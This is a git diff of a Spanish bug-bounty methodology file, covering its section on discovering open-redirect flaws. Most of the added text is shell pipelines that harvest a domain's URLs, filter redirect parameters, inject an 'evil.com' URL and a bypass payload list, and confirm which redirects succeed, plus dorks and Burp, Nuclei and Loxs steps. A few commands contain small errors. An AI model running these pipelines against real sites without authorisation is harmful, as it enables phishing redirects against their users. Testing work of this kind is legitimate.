@@ -545,24 +545,123 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
 
 # ***VII. Open Redirect in Web Apps***
 
-`Open Redirect` es una falla de seguridad común que permite a los atacantes redirigir a los usuarios a sitios web maliciosos. Esta vulnerabilidad ocurre cuando una aplicación web acepta URL introducidas por el usuario sin la validación ni el control adecuado.
-
-### 7.1. Usando plantilla favorita de Nuclei.
+`Open Redirect` es una falla de seguridad común que permite a los atacantes redirigir a los usuarios a sitios web maliciosos. Si el servidor acepta ciegamente la URL suministrada por el usuario y redirige sin comprobaciones se convierte en una vulnerabilidad de open redirect. En este escenario, el atacante manipula el parámetro URL para redirigir al usuario a un sitio malicioso bajo su dominio controlado.
    - ```bash 
-      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/openRedirect.yaml -c 30
+      https://example.com/redirect?url=http://malicious.com
       ```
-### 7.2. Usando Google Dorking
+### 7.1. Recopilar múltiples URL activas y pasivas de todas las herramientas y fuentes disponibles.
+   - Para un solo dominio
+   - ```bash 
+      echo target.com | gau --o urls1.txt
+      echo target.com | katana -d 2 -o urls2.txt
+      echo target.com | urlfinder -o urls3.txt
+      echo target.com | hakrawler > urls4.txt     
+      ```
+   - Para mutiples dominios
+   - ```bash 
+      subfinder -d target.com -all -o subdomains1.txt
+      assetfinder --subs-only target.com > subdomains2.txt
+      sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt
+      cat uniqsubs.txt | httpx-toolkit -o finallist.txt
+
+      cat finallist.txt | gau --o urls1.txt
+      cat finallist.txt | katana -d 2 -o urls2.txt
+      cat finallist.txt | urlfinder -o urls3.txt
+      cat finallist.txt | hakrawler > urls4.txt     
+      ```
+   - Una vez recopiladas todas las URL, es hora de filtrar las duplicadas y ordenarlas.
+   - ```bash 
+      cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt     
+      ```
+### 7.2. Filtrado de URL para parámetros de redirección.
+   - ```bash 
+      cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
+      ```
+   - Un enfoque más eficaz es utilizar el patrón de la herramienta gf para filtrar sólo los parámetros de redirección abiertos con el siguiente comando:
+   - ```bash 
+      final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
+      ```
+   - Ahora es el momento de la fase final de explotación. Identifiquemos posibles cargas útiles y comprobemos si las redirecciones tienen éxito.
+   - ```bash 
+      cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+      ```
+### 7.3. También puede conseguir lo mismo utilizando el siguiente método.
+   - ```bash 
+      subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+      ```
+   - Para buscar todas las cargas útiles de desvío de redirección abiertas de mi lista personalizada, utilice el siguiente comando
+   - ```bash 
+      cat redirect_params.txt | while read url; do cat home/paulportanc/Github/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+      ```
+### 7.3. También puede obtener los mismos resultados utilizando el siguiente método para uno o varios dominios de destino.
+   - ```bash 
+      echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+      subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+      ```
+### 7.4. También puede utilizar la herramienta CURL para realizar pruebas masivas de redireccionamiento abierto con el siguiente comando.
+   - ```bash 
+       cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
+      ```  
+### 7.5. Pruebas usando plantilla de Nuclei.
+   - ```bash 
+      cat dominios.txt | nuclei -t /home/paulportanc/nuclei-personalizado/openRedirect.yaml -c 30
+      ```
+### 7.6. Utilizar virustotal.
+   - ```bash 
+      https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com
+
+      ./virustotal.sh domains.txt | gf redirect
+      ```
+### 7.7. Utilizar Burpsuite.
+   - ```bash 
+      Paso 1: Interceptar la respuesta de destino en Burp Suite y clic derecho Engagement tools->Discover content. Enviarla a «Discover Content» para el rastreo activo en el dominio de destino.
+      Paao 2: Tras el rastreo, encontrará numerosas URL con parámetros en la pestaña Destino.
+      Paso 3: Después de esto filtre todas las respuestas a sólo códigos de estado de la serie 300, elija un parámetro de redirección y envíelo a la pestaña Intruder.
+      Paso 4: Y ahora añade la posición del parámetro donde quieres fuzzear todos los payloads de bypass de open redirect. Puedes encontrar la lista en mi repositorio de GitHub. Ahora comience el ataque. Asegúrate de que la codificación automática de URL está desactivada y puedes añadir google.com o cualquier sitio que quieras comprobar en Response Matching.
+      Paso 5: Ahora utilice la opción Filtro para ver sólo los códigos de estado de la serie 300 en la respuesta. Aquí encontrará todas las redirecciones del objetivo. Asegúrate también de comprobar la longitud de la respuesta para obtener resultados más precisos.
+      Paso 6: Ahora puede copiar cualquier solicitud y pegarla en el navegador para verificar la redirección.
+      ```
+### 7.8. Usando Loxs tool
+   - ```bash 
+      cat openredirect.txt | gf redirect | uro | sed 's/=.*/=/' > loxs.txt
+
+      cp loxs.txt /home/snow/loxs
+      cd /home/snow/loxs
+      python loxs.py 
+      option 2
+      [?] Enter the path file.....: loxs.txt
+      [?] Enter the path payload file: payloads/or.txt
+      [?] .....: press enter
+      ```
+### 7.9. Usando Google Dorking
+   - ```bash 
+      site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
+      
+      
+      inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target
+      ```
    - ```bash 
       python dorking.py
-      Enter The Dork Search Query: site:.ru(inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uir= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= |  inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http= | inurl:&)
+      Enter The Dork Search Query: site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
+     
       Enter Total ....: all
       Do You Want to save...: y
       Enter Output Filename: openredirect
 
      cat openredirect | wc -l
-     cat openredirect | gf redirect 
+     cat openredirect | gf redirect
+      ```
+### 7.10. Http-toolkit
+   - ```bash
+      cat domains.txt | gau --o urls.txt
+      cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+      cat urls.txt| gf redirect | uro | while read url; do cat /home/paulportanc/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
       ```
 
+
+     
 -------------------------------------------------------------------------------------------------
 
 
